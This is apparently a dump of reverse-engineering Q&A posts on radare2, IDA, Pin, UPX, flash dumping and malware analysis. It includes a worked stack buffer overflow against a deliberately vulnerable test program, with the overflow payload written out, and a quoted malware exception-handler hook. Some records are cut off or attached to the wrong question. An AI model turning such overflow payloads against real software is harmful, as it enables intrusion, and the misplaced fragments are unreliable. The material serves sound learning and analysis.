"How to find a symbol in a binary using radare2?","752","","<p>I want to find an address of a symbol (e.g <code>strcpy</code>) inside a binary using radare2. I tried to use the <code>f</code> command to list all flags which are recognized by r2 but the list is enormous and it's not comfortable to find the address of a specific symbol that way.  </p>

<p>What is the best way, if there's any, to do so.</p>
","<p>The <code>f</code> command is used to list all the flags from the selected flagspace. By default all the available flagspaces are selected. In order to select the 'symbols' flagspace and list only the flags inside it, use:</p>

<pre><code>[0x004049a0]&gt; fs symbols
[0x004049a0]&gt; f
0x00402a00 261 main
0x004049a0 41 entry0
0x0061e600 8 obj.__bss_start
0x00413c8c 9 sym._fini
0x0061e610 4 obj.optind
0x004022b8 26 sym._init
0x0061e620 8 obj.program_invocation_name
0x0061e600 0 loc.__bss_start
0x0061f368 0 loc._end
0x00412960 38 sym._obstack_memory_used
0x0061e5f8 8 obj.obstack_alloc_failed_handler
0x00412780 17 sym._obstack_begin
0x0061e640 8 obj.stderr
0x004128f0 106 sym._obstack_free
0x004128c0 48 sym._obstack_allocated_p
0x0061e618 8 obj.optarg
0x004127a0 21 sym._obstack_begin_1
0x004127c0 245 sym._obstack_newchunk
0x0061e608 8 obj.stdout
</code></pre>

<p>However, my preferred way to list all the symbols is to use the <code>i</code> command which actually uses 'rabin2' (<code>man rabin2</code>) to retrieve information about the binary. Use <code>i?</code> to get help about the command.</p>

<p>In order to list all the symbols run <code>is</code>.
If you want to ""grep"" for a specific symbol use radare's internal grep <code>~</code>:</p>

<pre><code>[0x004049a0]&gt; is~strcpy
vaddr=0x004023c0 paddr=0x000023c0 ord=013 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.strcpy
</code></pre>

<p>And if you want only the address, use:</p>

<pre><code>[0x004049a0]&gt; is~strcpy[1]
0x004023c0
</code></pre>

"What different UPX formats exist and how do they differ?","748","","<p>Recently I asked a <a href=""https://reverseengineering.stackexchange.com/q/168/214""> question about detecting UPX compression</a>. <a href=""https://reverseengineering.stackexchange.com/users/245/0xc0000022l"">0xC0000022L</a> wanted to know if it was plain UPX. However until that point I only was aware of <a href=""http://upx.sourceforge.net/"" rel=""nofollow noreferrer"">plain UPX</a>. So my question is:</p>

<ul>
<li>What versions/modifications of UPX exist?</li>
<li>How do they differ? What features do they have?</li>
</ul>
","<p>I will ignore that there's multiple compression algorithms in UPX and that there's been multiple versions of UPX. </p>

<p>Generally when people ask if it's plain or vanilla UPX it's because malware and other software likes to take UPX and modify it slightly so that it can't be unpacked with the standard UPX executable and so that anti viruses will have a harder time unpacking it. It's not very effective at counteracting reverse engineering.</p>

"Dumping Flash Memory Using Bus Pirate","747","","<p>I'm planning on dumping and reading the flash memory of a Winbond W25Q128FV chip. I've done some research and plan on buying the following tools to achieve this:</p>

","<p>Sounds like you're good to go. Yes the Raspberry has a SPI interface so you can connect the Winbond to it and use the ""flashrom"" to dump it. Attach the SOIC clip to the chip and connect the pins to the Raspberry Pi respective pins:

"KiUserExceptionDispatcher hook","745","","<p>i am analyzing a piece of malware in which first the address to ""KiUserExceptionDispatcher"" is obtained(using the Export Name Table, going to Export Ordinal Table and then finally to Export Address Table). Once the address(7773A408) is received, the malware overwrites the first 6 bytes with the following lines :</p>

<pre><code>      (here is the finding part)
                ...
   mov BYTE PTR DS:[EDX], 68             -&gt; EDX contains ntdll.KiUserExceptionDispatcher
   mov DWORD PTR DS:[EDX+1], malware.004035C2
   mov BYTE PTR DS:[EDX+5], 0C3
   ....
</code></pre>

<p>So, the hex window at 7773A408 (address of KiUserExceptionDispatcher) changes in the following way:</p>

<pre><code>  7773A408   FC 8B 4C 24 | 04 8B .... (and so on)    &lt;- original

  7773A408   68 C2 35 40 | 00 C3 .....(and so on)    &lt;- after overwriting
</code></pre>

<p>So, what happens then is that the malware reaches a ""UD2"" instruction. I looked it up: it raises an invalid opcode exception. 
Then the malware jumps to </p>

<pre><code> 7773A40D   RETN    
</code></pre>

<p>which then leads me to:</p>

<pre><code>004035C2  DB 8B     &lt;- clear, because 004035C2 starts at 7773A40D (hex window)
</code></pre>

<p>and then finally to another place where a whole new function begins.
So, my question would be: Is it right to assume that the malware tries to change exception handler by overwriting it with 004035C2 to redirect the excetion flow? Why is the exception handler of UD2 the first 6 bytes of KiUserExceptionDispatcher? </p>

<p>best regards,</p>
","<p>The malware overwrites the usermode exception dispatcher (<code>KiUserExceptionDispatcher()</code>) with the following:</p>

<pre><code>PUSH malware.004035C2
RETN
</code></pre>

<p>The code above is equivalent to <code>JMP malware.004035C2</code>.</p>

<p>Now whenever any usermode exception occurs in the process, the function at <code>malware.004035C2</code> will be executed instead of (or at least before) the registered <a href=""http://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#Structured_Exception_Handling"" rel=""nofollow"">SEH</a> functions.</p>

<p>The malware likely uses this ""trick"" in combination with the <code>UD2</code> instruction in order to confuse disassemblers, since most disassemblers won't automatically figure out that the <code>UD2</code> instruction now effectively jumps to <code>malware.004035C2</code>.

"Becoming A Better Reverse Engineer","743","","<p>I have been looking on the net and all I see when it comes to reverse engineering are a bunch of silly crackme tutorials. I want to be better at taking code from assembly to c or c++. I am getting the feeling that I am going to have to have to pick this all in time and or make a bunch of small programs and break them apart.I would like to build on what might be already out there. I am already some what proficient in what I am doing just I want to be better.</p>

<p>For example:</p>

<pre><code>mov     eax, DDrawPtr
push    8
push    1E0h
push    280h
mov     ecx, [eax]
push    eax
call    dword ptr [ecx+54h]
</code></pre>

<p>Hex-rays translates this as </p>

<pre><code>v1 = (*(**DDrawPtr + 0x54))(*DDrawPtr, 640, 480, 8)
</code></pre>

<p>which is ok.... It should be .</p>

<pre><code>HANDLE v1 = DDrawPtr -&gt; SetDisplayMode(640,480,8);
</code></pre>

<p>or sometimes IDA makes mistakes and will say</p>

<pre><code>int __cdecl sub_41B869()
</code></pre>

<p>Where as this code doesn't return anything and is supposed to be a void....</p>

<p>I found a neat question and answer here <a href=""https://reverseengineering.stackexchange.com/questions/2096/convert-this-x86-asm-to-c"">Stackoverflow question/answer</a>.
I am wanting to learn more like this because I am realizing that IDA makes mistakes. I want to know how to recognize function types and more importantly do this by hand, because I am seeing IDA make mistakes and I feel that I should learn to recognize better these mistakes and see how I can manually if need bring it back.</p>

<p>Here is a book that does this somewhat but it goes from C to assembly not the other way around. <a href=""http://beginners.re/RE_for_beginners-en.pdf"" rel=""nofollow noreferrer"">reverse engineering pdf</a></p>

<p>Any suggestions?</p>
","<p>These suggestions may help.  One sure way of becoming a better reverse engineer is to become a better ""forward engineer""!  Here's what I would suggest:</p>

<ol>
<li><strong>Examine the assembly output of various compilers.</strong>  Write test programs of increasing complexity and examine the assembly language output so that you get a sense of what the compiler does for any given high level construct.</li>
<li><strong>Try running binaries through a decompiler.</strong> This will allow you to see how those same programs are interpreted by a tool and allow you to begin to see the kinds of errors that the tools make.</li>
<li><strong>Try completely reverse engineering a small project.</strong> It's not hard to find source code for all kinds of things these days.  Pick an open source project that you are <em>not</em> familiar with, compile it without peeking at the code and try to reverse engineer it entirely.  Alternatively, try reverse engineering some particular routine or aspect (which is more usual).</li>
<li><strong>Try to write code to fool the decompiler.</strong> Open source projects typically don't take any anti-disassembly measures but other kinds of software (e.g. malware) often does.  Learn these techniques in the forward direction and then look at the results with your reverse engineering tools.  You'll get a feel for which techniques are successful and why.</li>

"Writing an exploit for sample-application","743","","<p>I understand the principles of exploiting a classical stack-based buffer-overflow, and now I want to practice it. Therefore I wrote the following test-application:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

void public(char *args) {
    char buff[12];
    memset(buff, 'B', sizeof(buff));

    strcpy(buff, args);
    printf(""\nbuff: [%s] (%p)(%d)\n\n"", &amp;buff, buff, sizeof(buff));
}

void secret(void) {
    printf(""SECRET\n"");
    exit(0);
}

int main(int argc, char *argv[]) {
    int uid;
    uid = getuid();

    // Only when the user is root
    if (uid == 0)
        secret();

    if (argc &gt; 1) {
        public(argv[1]);
    }
    else
        printf(""Kein Argument!\n"");
}
</code></pre>

<p>When the user which starts the program is <em>root</em>, the method <code>secret()</code> is being called, <em>otherwise</em>, the method <code>public(...)</code> is being called.
I am using debian-gnome x64, so I had to compile it specifically to x86 to get x86-assembly (which I know better than x64).
I compiled the program with gcc: <code>gcc ret.c -o ret -m32 -g -fno-stack-protector</code></p>

<hr>

<p><strong>Target:</strong>
I want to call the method <code>secret()</code> without being a <em>root-user</em>. <em>{To do that I have to overwrite the <code>R</code>eturn <code>I</code>nstruction <code>P</code>ointer (<code>RIP</code>) with the address of the function <code>secret()</code>}</em></p>

<p><strong>Vulnerability:</strong>
The method <code>public(...)</code> copies the program-args with the unsafe <code>strcpy()</code> method into the <code>char-array</code> <strong>buff</strong>. So it is possible to overwrite data on the stack, when the user starts the program with an <em>arg > 11</em>, where <em>arg</em> should be the length of the string-arg.</p>

<p><strong>Required Information:</strong></p>

<ul>
<li>The address of the function <code>secret()</code>.</li>
<li>The address of the first buffer's first element. Due to <code>ASCII</code>-Encoding I know that each <code>char</code> has a size of <code>1 byte</code>, so that the buffer's last element is <code>12 bytes</code> ahead the first element.</li>
<li>The address of the <code>RIP</code>, because I have to overwrite it <code>secret()</code>s address.</li>
<li><em>OPTIONAL: It also helps to know the address of the <code>S</code>afed <code>F</code>rame <code>P</code>ointer (<code>SFP</code>).</em></li>
</ul>

<p><strong>Methodical approach:</strong></p>

<ul>
<li>Load the program into <code>gdb</code>: <code>gdb -q ret</code>.</li>
<li>To get an overview of the full stack-frame of the method <code>public(...)</code> I have to set a breakpoint there, where the <code>function-epilogue</code> starts. This is at the enclosing brace <code>}</code> at line <code>11</code>.</li>
<li>Now I have to run the program with a valid arg: <code>run A</code>.</li>
<li><p>At the breakpoint, I now want to view the stack-frame.</p>

<pre><code>(gdb) info frame 0
Stack frame at 0xffffd2f0:
 eip = 0x804852d in public (ret.c:11); saved eip = 0x804858c
 called by frame at 0xffffd330
 source language c.
 Arglist at 0xffffd2e8, args: args=0xffffd575 ""A""
 Locals at 0xffffd2e8, Previous frame's sp is 0xffffd2f0
 Saved registers:
  ebp at 0xffffd2e8, eip at 0xffffd2ec
</code></pre>

<p>Because from that I can gather the following information:</p>

<ul>
<li>The <code>RIP</code> is located at <code>0xffffd2ec</code> and contains the address <code>0x804858c</code> which contains the instruction <code>0x804858c &lt;main+61&gt;: add    $0x10,%esp</code>.</li>
<li>The <code>SFP</code> is located at <code>0xffffd2e8</code>.</li>
<li><p>Now I need the address, where the <code>secret()</code>-function starts:</p>

<p>(gdb) print secret
$2 = {void (void)} 0x804852f </p></li>
</ul></li>
<li><p>Last, but not least I get the buffer's address:</p>

<pre><code>(gdb) print/x &amp;buff
$4 = 0xffffd2d4
</code></pre></li>
<li><p>To sum it up:</p>

<ul>
<li><code>RIP</code> is at <code>0xffffd2ec</code>.</li>
<li><code>SFP</code> is at <code>0xffffd2e8</code>.</li>
<li><code>buff</code> is at <code>0xffffd2d4</code>.</li>
</ul></li>
</ul>

<p>This means that I would have to run the program with <code>0xffffd2ec</code> - <code>0xffffd2d4</code> + <code>0x04</code> = <code>28 bytes</code> (= <code>char</code>s).</p>

<p>So, to exploit it I'd have to run the program with an arg which is <code>28 bytes</code> long whereas the last <code>4 bytes</code> contain the address of the function <code>secret()</code> (and pay attention to little-endian-ordering):</p>

<p>It's because you're overwriting the return address on the stack with <code>0xffffd2ec</code> instead of <code>0x0804852f</code> (the latter is the address for <code>secret()</code>).</p>

<p>If you thus use <code>'{print ""A""x24; print ""\x2f\85\04\08""; }'</code> instead, it should work.</p>

<blockquote>
  <ul>
  <li>Why is between <code>buff</code> and the <code>SFP</code> a <code>8-byte</code> gap? What does this memory-area contain?</li>
  </ul>
</blockquote>

<p>That gap is probably because of attempted optimizations made by gcc. The memory-area contains nothing (well, technically it contains 8 bytes whose values are indeterminate) and the code in the <code>public()</code> function neither reads from nor writes to that memory-area.</p>

"Is it possible to force IDA to acknowledge unusual frame pointer deltas?","740","","<p>I keep coming across a compiling pattern that IDA doesn't automatically handle well.  Consider the following example:</p>

<pre><code>mov rax, rsp       ; Set rax at the start of the function
...
lea rbp, [rax-5Fh] ; Shortly afterward, set rbp as the frame pointer at a nonstandard offset
...
mov [rbp+3Fh], rcx ; Reference all stack offsets from rbp for the rest of the function
...
</code></pre>

<p>In this example, it appears that IDA has lost track of <code>rbp</code>'s state as an offset into the stack frame, presumably because of the additional indirection.  (We copy from <code>rsp</code> to <code>rax</code> to <code>rbp</code>, rather than just from <code>rsp</code> to <code>rbp</code>)</p>

<p>I would like the above example to look something more like this:</p>

<pre><code>var_20= qword ptr -20h
...
mov [rbp+5Fh+var_20], rcx
</code></pre>

<p>However, as one would expect, if I change the type of <code>3Fh</code> to be a stack offset, I get the following:</p>

<pre><code>arg_37= qword ptr 3Fh
...
mov [rbp+arg_37], rcx
</code></pre>

<p>Which is obviously not correct.  I have two questions:</p>

<ul>
<li><strong>Is it possible to generate the desired output?</strong></li>
<li><strong>If not, how would one normally deal with this?</strong></li>

The downsides are that I would have to create a structure for each stack frame I analyze, and I would also not have cross-references.</li>
<li>I could just use the incorrect offsets in the stack frame.  This would give me cross-references, but I would expect things to break when touching <code>r</code>, the offset storing the return address.</li>

"Colorize and disassemble byte sequences with IDA Pro and IDAPython","739","","<p>Maybe someone could help me with the following problem:</p>

<li><p>If the byte sequence is 9 bytes long (as in the example above), <strong>how can I tell IDAPython to disassemble all 9 bytes</strong>.

"Custom UI buttons","736","","<p>I just started using IDA and OllyDbg, although I am experienced developer but before this I was reverse engineering only Java and .Net code which is much more easy task comparing of what I need to do now.</p>

<p>I have an application which has some buttons that are not accessible by Spy++ and WinInspector and all other tools that I tried. Spy++ sees only the <code>selectorclass</code> which is the whole panel where buttons are placed. I've managed to find where the <code>WndProc</code> of this selector is and even the method wich takes hwnd of <code>SelectorControl</code> from <code>GetPropA</code> method, but I have trouble identifying the click itself, so i don't know where the actual button is clicked and where there the app knows what exact button is clicked and what handler to use. </p>

<p>I would like to ask for some tips which are maybe useful to know but are not known by newbies like me. What are strategies that can be used here?</p>

<p>Maybe there are some ways to identify what framework was used, so I can play with that framework to know what to look for.</p>
","<p>If the surrounding window seems to be a genuine window, but the individual buttons are not, I'd assume that</p>

<ul>
<li>The surrounding window displays a bitmap, or does whatever else is needed to display the individual buttons</li>
<li>The surrounding window reacts on mouse clicks</li>
<li>And, the surrounding window determines itself which ""button"" is used by looking at the mouse coordinates at the time of the mouse click.</li>
</ul>

<p>So, what we want to do is, start the program in a debugger, and use a breakpoint that is triggered when the mouse click occurs. The problem is, the window procedure gets called a lot of times, with all kind of messages, while you want to break on some of them (for example, <code>WM_LBUTTONDOWN</code>), but not on most of the others (for example, <code>WM_PAINT</code>).</p>

<ul>
<li>Ollydbg can do this directly - place a conditional breakpoint that triggers depending on the window message.</li>
<li>If, for whatever reason, you can't use that feature, you need to disassemble (and partially understand) the window procedure. It will receive 4 parameters on the stack, the 2nd of which is the window message (see <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms633570%28v=vs.85%29.aspx"" rel=""nofollow"">Using Window Procedures</a>). The window procedure will, at some point, compare this parameter to the values of well-known window message IDs. You might be interested in <code>WM_LBUTTONDOWN</code> (<code>0x0201</code>) or one of the other <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms645533%28v=vs.85%29.aspx"" rel=""nofollow"">Mouse Input Events</a>). Check where the code branches to when it receives one of those ""interesting"" messages, and place a breakpoint on that branch.</li>
</ul>

<p>After placing a suitable breakpoint, run your application in the debugger, click the mouse, and hope the debugger actually hits the breakpoint. If it doesn't, check which mistake you've made.</p>

<p>Single-Step your code. It will probably fetch parameter 4 from the stack, which encodes the X and Y coordinates of the mouse, and compare these parameters to something - chances are, there's an array of structures that defines rectangles and jump addresses, and a loop that checks against each entry.</p>

<p>Once you've found that, you're finished.</p>

<p>Sounds too easy? It probably is, because, depending on your framework, the actual comparisons might be buried deeply in stuff that was a bunch of C++ classes in the original source, and there might be various calls, some of them indirect (in the case of C++ class methods) until you get to the ""interesting"" position.</p>

<ul>
<li><p>Sometimes it's easier to use Ollydbg to resolve this. Single-Step the source after your breakpoint, using ""step over"" to step over function calls. Whenever you see something interested happened within the function call, note the address. Restart your program, run to your breakpoint, run to the address you noted, and ""step into"" the function this time. This will allow you to put the finger on the interesting code relatively quickly, while stepping over all the <code>strcmp()</code> and <code>malloc()</code> and <code>WriteALotOfStuffToSomeFileIfDebuggingIsOn()</code> functions.</p></li>
<li><p>Sometimes it's easier to use IDA. Generate a call tree from your window procedure, focus on the first 3-5 levels. Search your code for occurrences of magic numbers, like the <code>0x0201</code> above. Check if one of these is a <code>CMP XX, 0x0201</code> in one of the functions in your call tree. This might be just the position you're looking for.</p></li>
<li><p>Make a screen shot, and paste it into some image viewer program (I like <code>Irfanview</code> for that). Get the pixel coordinates of the button within the frame window. Search, in the data section, for those values, surrounded by what looks like a table of similar data. This might be your coordinate/jump table. If you find something, place a hardware breakpoint on it to find out when that memory gets accessed, or use the IDA cross reference list to get respective addresses in your code.</p></li>

"Disassemble using an emulator","736","","<p>I learned the disassembly challenges from <a href=""https://www.usenix.org/legacy/event/usenix03/tech/full_papers/prasad/prasad_html/node5.html"" rel=""nofollow"">this link</a>. The following six challenges are listed in that article:</p>

<ol>
<li>Data embedded in the code regions</li>
<li>Variable instruction size</li>
<li>Indirect branch instructions</li>
<li>Functions without explicit CALL sites within the executable's code segment</li>
<li>Position independent code (PIC) sequences</li>
<li>Hand crafted assembly code.</li>
</ol>

<p>However, I am thinking about the following disassembly method which seems to solve the above challenges. Assuming we have an executable to be disassembled, an input set that can has 100% coverage of the code, and an emulator (e.g. QEMU). Then, we can instrument the emulator to output each instruction executed by the emulated CPU and the corresponding memory address. After that, we can translate each instruction to assembly instruction, and the whole program is now disassembled. </p>

<p>Could you please tell me why this idea will not/will work?</p>
","<blockquote>
  <p>an input set that can has 100% coverage of the code</p>
</blockquote>

<p>This may be <em>very</em> difficult to achieve, especially if the code behavior depends on something that you don't directly control (time, memory, OS version/environment, random number generator etc.). Additional observations:</p>

<ol>
<li>actually executing all that code may take more time than you can afford</li>
<li>executing some parts of the code may require conditions you cannot satisfy (e.g. a specific hardware peripheral)</li>
<li>you will miss code which is present in binary but never executes (dead code). In some cases such code can reveal additional information about the binary</li>
<li>your approach may discover all code, but it will likely miss a lot of <em>data</em>.</li>
</ol>

<p>However, it does not mean that the approach is completely useless. In fact there's already been some work in this area. For example, check out the S2E (Selective Symbolic Execution) project:</p>

<p><a href=""https://sites.google.com/site/dslabepfl/proj/s2e"">https://sites.google.com/site/dslabepfl/proj/s2e</a></p>

<blockquote>
  <p>Conceptually, S2E is an automated path explorer with modular path analyzers: the explorer drives the target system down all execution paths of interest, while analyzers check properties of each such path (e.g., to look for bugs) or simply collect information (e.g., count page faults). Desired paths can be specified in multiple ways, and one can either combine existing analyzers to build a custom analysis tool, or write new analyzers using the S2E API.</p>
  
  <p>S2E helps make analyses based on symbolic execution practical for large software that runs in real environments, without requiring explicit modeling of these environments.</p>

"Why IDA aggressively assumes 'nothing' on segment registers?","732","","<p>I'm disassembling a packed 16 bit DOS MZ EXE.</p>

<p>To deobfuscate it, I've set a breakpoint in DOSbox at the end of the unpacking routine, let it run, and made a memory dump. This way I essentially got the deobfuscated EXE image. Then I loaded this image in IDA.</p>

<p>Obviously, there's no MZ header anymore, so IDA can't know the application's entry point and initial values of CS, SS and other segment registers. I, however, do know these values, and I'm willing to supply them to IDA. To do this, I hit <kbd>Alt</kbd>+<kbd>G</kbd> and type the register's value.</p>

<p>However, instead of showing <code>assume ds:&lt;value&gt;</code>, IDA shows</p>

<pre><code>seg000:1AEBC                     assume es:nothing, ss:nothing, ds:nothing
</code></pre>

<p>Why?</p>

<p>Another question. Why there is no option to set the value of CS register? Consider code which contains near jumps. Without knowledge about the CS register value, IDA won't be able to proceed with disassembling. But I <em>do</em> know what value CS has at this specific point! How do I supply this information to IDA if the <code>Segment Register Value</code> dialog window doesn't have CS option?</p>
","<p>DOS programs used segments and IDA was made to mimic that behavior. That's why you cannot change CS (since in properly set up database CS is just the segment's base) and why your changes to segment registers do now show up (because there is no segment corresponding to the values you enter).</p>

<p>I would suggest opening a normal (not packed) MZ file to see how it's supposed to look. If you keep fighting IDA instead of working with it you'll keep having problems.</p>

"Howto setup IDA Pro Dalvik Debugger Process Options to debug APK on a real device","730","","<p>I had some fun using IDA Pro Dalvik Debugger in the past using AVD emulator.

"How to make radare2 work for a large binary?","727","","<p>I compiled <a href=""https://github.com/python/cpython"" rel=""nofollow noreferrer"">cpython</a> with debugging headers and I want to perform the following <a href=""https://reverseengineering.stackexchange.com/questions/16081/how-to-generate-the-call-graph-of-a-binary/16082#16082"">analysis</a> using radare2. </p>

<p>The problem I encounter is that it takes forever (at least 27 hours) to perform the <code>aaa</code> (analysis) part. </p>
","<p>It is not a good practice to run full analysis of your binary at the startup and it also isn't encourged by radare. Running <code>aaa</code> by default is a heavy action and absolutely not recommended or needed in most of the cases.</p>

<p>As stated in <a href=""http://radare.today/posts/analysis-by-default/"" rel=""noreferrer"">this execllent post</a> from radare's blog:  </p>

<blockquote>
  <p>Code analysis is not a quick operation, and not even predictable or taking a linear time to be processed. This makes starting times pretty heavy, compared to just loading the headers and strings information like it’s done by default.<br>
  ...<br>
  We enforce users to think about their workflows in order to better understand the problem they are facing and solve it in an optimal way, saving cpu, memory and why not: cats.</p>
</blockquote>

<p>To make the analysis process more efficient you can start with configuring different analysis configuration variables in radare. These configuration variables can help you to fit the analysis process to your program and to your needs. Some of the interesting variables are:  </p>

<pre><code>anal.afterjmp  
anal.depth  
anal.eobjmp  
anal.esil  
anal.hasnext  
anal.nopskip  
anal.from
anal.to
</code></pre>

<p><em>See the <code>e??anal.</code> command to get more detailed descriptions for them.</em>  </p>

<p>Analysis of a program isn't just performing one action and that's it -- it is combined from different analysis for different needs.<br>
radare implements many different commands that perform different kind of analysis. Smart use of these command can help you quick the process of the analysis and analyze only the parts which you believe are the most important:</p>

<ul>
<li>Find functions by prelude instructions (<code>aap</code>)    </li>
<li>Identify functions by following calls (<code>aac</code>)    </li>
<li>Detect jump tables and pointers to code section (<code>/V</code>)     </li>
<li>Analyze opcode absolute and relative references (<code>aa\r</code>)     </li>
<li>Find code/data/string references to a specific address (<code>/r</code>)    </li>
<li>Emulate code to identify new pointer references (<code>aae</code>)</li>
<li>Use binary header information to find public functions (<code>aas</code>)</li>
<li>Assume functions are consecutive (<code>aat</code>)</li>
</ul>

<p>To sums it up, you should think and plan the analysis process that fits best to your needs:</p>

<blockquote>
  <p>radare2 is not a click-and-run program, it’s a set of orthogonal tools and commands that allows you to understand, analyze, manipulate and play with a large list of binary types... Only experience and understanding will give you control on what you are doing.</p>

"Intel Pin memory operations tracking","727","","<p>I am using Intel Pin in order trace memory activity of an executable on Windows. What I have found, that most of the memory operands (Read or Write) operates with 2 or 4 bytes. So I decided to modify original Pin's <em><a href=""https://software.intel.com/sites/landingpage/pintool/docs/71313/Pin/html/index.html#MAddressTrace"" rel=""nofollow"">pinatrace</a></em> example, in order to see which Assembly opcodes produces which memory activity.</p>

<pre><code>VOID Instruction(INS ins, VOID *v)
{

        UINT32 memOperands = INS_MemoryOperandCount(ins);
        fprintf(trace,""\n[%s]\n"",(INS_Disassemble(ins)).c_str()); 
        for (UINT32 memOp = 0; memOp &lt; memOperands; memOp++)
        { 
             .....
</code></pre>

<p>What it basically does (I hope), is just writes disassembled opcode BEFORE the memory operands it produces. But then I looked in the file (W is for write, R is for read):</p>

<blockquote>
  <p>[test edx, 0x800000]</p>
  
  <p>[jnz 0x77708557]</p>
  
  <p>[mov dword ptr [ebp-0x4], edi]</p>
  
  <p>[test dl, 0x1]</p>
  
  <p>[jnz 0x77703136] RWWRWW </p>
  
  <p>[lea edi, ptr [ebx+0xcc]]</p>
  
  <p>[push dword ptr [edi]]</p>
  
  <p>[call 0x77702520] RWW </p>
  
  <p>[mov edi, edi]</p>
  
  <p>[push ebp]</p>
  
  <p>[mov ebp, esp]</p>
  
  <p>[mov eax, dword ptr [ebp+0x8]]</p>
  
  <p>[mov ecx, dword ptr fs:[0x18]]</p>
  
  <p>[lea edx, ptr [eax+0x4]]</p>
  
  <p>[lock btr dword ptr [edx], 0x0]</p>
  
  <p>[jnb 0x777041dc]</p>

  <p>[mov eax, 0x1]</p>
  
  <p>[pop ebp]</p>
  
  <p>[ret 0x4] WRRRWRWWRR</p>
</blockquote>

<p>As we can see, opcodes that are supposed to work with memory (e.g. <em>mov</em>) do not produce memory operands. While memory traces are connected as blocks after <strong>ret/call/jnz</strong> etc.</p>

<p><strong>Question</strong>: What kind of memory operands does Intel Pin trace? Is it about calls to virtual memory/RAM/CPU registers? Could it be possible, that memory activity goes in blocks due to CPU's pipeline?</p>
","<p>So, finally I came up with the solution that works how I want and results seem to be valid according to <a href=""http://www.agner.org/optimize/instruction_tables.pdf"" rel=""nofollow"">enter link description here</a></p>

<pre><code>fprintf(trace,""\n[%s]\n"",(INS_Disassemble(ins)).c_str()); //(INS_Disassemble(ins)).c_str()
        fflush(trace);


        for (UINT32 memOp = 0; memOp &lt; memOperands; memOp++)
        {

            if (INS_MemoryOperandIsRead(ins, memOp))
            {
                fprintf(trace,""R"");
                icount++;

            }

            if (INS_MemoryOperandIsWritten(ins, memOp))
            {

                fprintf(trace,""W"");
                icount++;

            }
        }
</code></pre>

<p>And it produces the following output:</p>

<pre><code>[mov eax, dword ptr [ebp+0x10]]
R
[mov byte ptr [ebx+0x2], 0x0]
W
[mov byte ptr [ebx+0x7], 0x0]
W
</code></pre>

<p>I cannot be sure that it is the true sequence of executable under analysis because I do output in the instrumentation phase, but the code can probably be modified it the way to write opcode inside another  INS_InsertPredicatedCall, so it will be recorded when it will be executed.</p>

"Limitations of capstone's disassembly capabilities compared to IDA","725","","<p>I was wondering if there are any limitations of capstone's disassembling capabilities when compared to IDA.</p>

<p>If yes, are those limitations inherent, i.e. a result of the different design/techniques that capstone and ida use? Or are they rather due to ""not yet implemented"" features, e.g. capstone's fewer supported CPUs?</p>

<p>If there are inherent limitations, could you give an example?</p>

<p>I am talking about the disassembling only, i.e., I am not interested in things like available APIs, commercial support, license models, plug-in systems, debugging support etc. Just the pure disassembly.</p>

<p>Capstone is mentioned as one answer to the post <a href=""https://reverseengineering.stackexchange.com/questions/1817/is-there-any-disassembler-to-rival-ida-pro"">""Is there any disassembler to rival IDA Pro?""</a>, but it seems to be a copied/pasted text from the capstone website.</p>

<p>PS: The working of IDA is explained/discussed <a href=""https://reverseengineering.stackexchange.com/questions/2347/what-is-the-algorithm-used-in-recursive-traversal-disassembly"">here</a>.</p>
","<p>There is no point in comparing between the two. IDA is more than a disassembler, it is a reversing tool which implements(or could be implemented via plugins) almost every feature you can think of. </p>

<p>Capstone on the other hand, is a simple disassembler engine. It by alone cannot generate the same quality of output as IDA.</p>

<p>For instance, IDA has cross-referencing capability. Cross-refs are generated by a dedicated analysis engine which uses input from the disassembly engine. A disassembly engine, <em>by its own</em> can neither find cross-refs, nor can it recursively disassemble like IDA.</p>

<p>You are comparing a disassembly framework to a tool with a myriad of features. They are not comparable with each other.</p>

<p>If you are talking about just the textual disassembler output, then there is not much of a difference per se.</p>

  <p>how would I go about decoding/decrypting PHP code which is
  encoded/encrypted using eAccelerator?</p>
</blockquote>

<p>You would have to reverse engineer the <code>eaccelerator_load()</code> function in eAccelerator.</p>

<p><a href=""http://article.gmane.org/gmane.comp.php.eaccelerator.devel/381"" rel=""nofollow"">Note that this function only exists in older versions of eAccelerator.</a> For example, see here for the function as it existed in version 0.9.4: <a href=""https://github.com/eaccelerator/eaccelerator/blob/e48010887b429a203bf03c7562e30a4d2bfa07d3/loader.c"" rel=""nofollow"">https://github.com/eaccelerator/eaccelerator/blob/e48010887b429a203bf03c7562e30a4d2bfa07d3/loader.c</a></p>

<p>The first thing the loader does is <code>base64_decode()</code> and <code>gzuncompress()</code> the string. You can see the (mostly plaintext) result of that here: <a href=""http://ddecode.com/phpdecoder/?results=744654407d52841255a5b54c1d5b402d"" rel=""nofollow"">http://ddecode.com/phpdecoder/?results=744654407d52841255a5b54c1d5b402d</a></p>

<p>It looks like restoring that to more readable code will take a bit more work with analyzing the <code>eaccelerator_load()</code> function, but I'm sure you'll be up to the task :)</p>

"Find Address of Windows Kernel Functions","723","","<p>How can I find the address of a Windows kernel function?</p>

<p>In this case I'm trying to find CreateThread.</p>

<p>Can this be done from a debugger? Olly/Immunity?</p>
","<p>It can be done programmatically with a combination of <code>NtQuerySystemInformation</code>, <code>LoadLibraryEx</code>, and <code>GetProcAddress</code>.</p>

<p>The code below may not work perfectly, as I don't have a Windows box to build it for testing.  However, it should move you in the correct direction.</p>

"Reverse engineering XKCD 1190","721","","<p>The latest (as of now) comic is titled <a href=""http://xkcd.com/1190/"">""Time""</a>. It's a standard-looking comic though without much action, but the picture's alt title says ""Wait for it."". I waited but nothing happened (tried in Opera and IE9) so I took a look at the page source.</p>

<p>Next to the picture's <code>&lt;img&gt;</code> tag there was a <code>&lt;script&gt;</code> which included the following URL:</p>

<p><a href=""http://imgs.xkcd.com/static/time07.min.js"">http://imgs.xkcd.com/static/time07.min.js</a></p>

<p>I tried to make sense of it, but I can't figure it out. Can someone explain how it works and what was supposed to happen?</p>
","<p>Somebody at XKCD fora pasted a link to this <a href=""https://gist.github.com/cincodenada/5246094"">gist</a> which contains a deobfuscated and annotated source along with some explanations: </p>

<blockquote>
